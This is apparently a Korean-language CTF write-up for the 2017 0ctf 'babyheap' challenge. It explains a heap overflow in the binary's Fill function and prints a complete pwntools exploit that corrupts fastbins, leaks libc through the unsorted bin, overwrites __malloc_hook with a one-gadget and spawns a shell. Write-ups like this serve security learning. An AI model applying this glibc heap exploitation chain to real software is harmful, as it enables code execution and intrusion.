---
title: "2017 0ctf babyheap"
date: 2020-1-22
tags: [0ctf]
categories: [0ctf]
---

64비트 바이너리다. 

```
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
```

보호기법은 다 걸려있다.

```
[*] '/vagrant/ctfs/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

각각 함수들의 기능들이다. 

```
sub_B70 : 초기 세팅을 해주는데 mmap으로 랜덤으로 생성된 주소를 매핑해준다. 
Allocate : calloc을 이용해서 사이즈만큼 할당해준다. 이때 할당된 영역은 다 0으로 초기화해준다.
Fill : 인덱스로 접근해서 원하는 사이즈만큼 데이터를 쓸 수 있다.
Free : 인덱스를 해제해준다.
Dump : 인덱스를 출력해준다.
Exit : 종료해준다.
```

Fill 함수에서 취약점이 발생한다. chunk의 크기를 체크하지 않으므로 chunk 크기 이상의 데이터를 쓸 수 있다.

unsorted bin -> main_arena leak -> __malloc_hook -> oneshot 

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./babyheap')
libc = e.libc
p = process('./babyheap')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def allocate(size):
	sla(':','1')
	sla(':',str(size))

def fill(idx,size,content):
	sla(':','2')
	sla(':',str(idx))
	sla(':',str(size))
	sa(':',content)

def free(idx):
	sla(':','3')
	sla(':',str(idx))

def dump(idx):
	sla(':','4')
	sla(':',str(idx))

# fastchunk 4 smallchunk 1 allocate
allocate(0x20) # 0
allocate(0x20) # 1
allocate(0x20) # 2
allocate(0x20) # 3
allocate(0x80) # 4
# 0, 1, 2, 3, 4 

# (2) fd -> (1)
free(1)
free(2)
# 0, ?, ?, 3, 4

# overwrite (2) fd -> (4) smallchunk 
payload = p64(0) * 5 + p64(0x31) + p64(0) * 5 + p64(0x31) + p8(0xc0)
fill(0,len(payload),payload)

# smallchunk -> fastchunk size overwrite
payload1 = p64(0) * 5 + p64(0x31)
fill(3,len(payload1),payload1)

allocate(0x20) # 1
allocate(0x20) # 2 -> (4)

# small chunk (4)
payload2 = p64(0) * 5 + p64(0x91)
fill(3,len(payload2),payload2)

allocate(0x80) # (5)
# 0, 1, 2, 3, 4, 5

# unsorted bin 
free(4) # fd bk -> main_arena + 88
# 0, 1, 2, 3, ?, 5

dump(2) # 2 -> (4) = leak (4)

libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00') - libc.symbols['__malloc_hook'] - 88 - 16
log.info('libc_base : '.format(hex(libc_base)))
oneshot = libc_base + 0x4526a
log.info('oneshot : {}'.format(hex(oneshot)))
malloc = libc_base + libc.symbols['__malloc_hook']
log.info('__malloc_hook : {}'.format(hex(malloc)))

allocate(0x68) # 4
free(4)
# 0, 1, 2, 3, ?, 5

fill(2,8,p64(malloc - 35)) # target (2) -> 4

allocate(0x60) # 4
allocate(0x60) # 6 -> (4) - __malloc_hook - 35

payload3 = 'A'*19 + p64(oneshot)
fill(6,len(payload3),payload3) # __malloc_hook -> oneshot

allocate(999) # allocate anysize

p.interactive()
```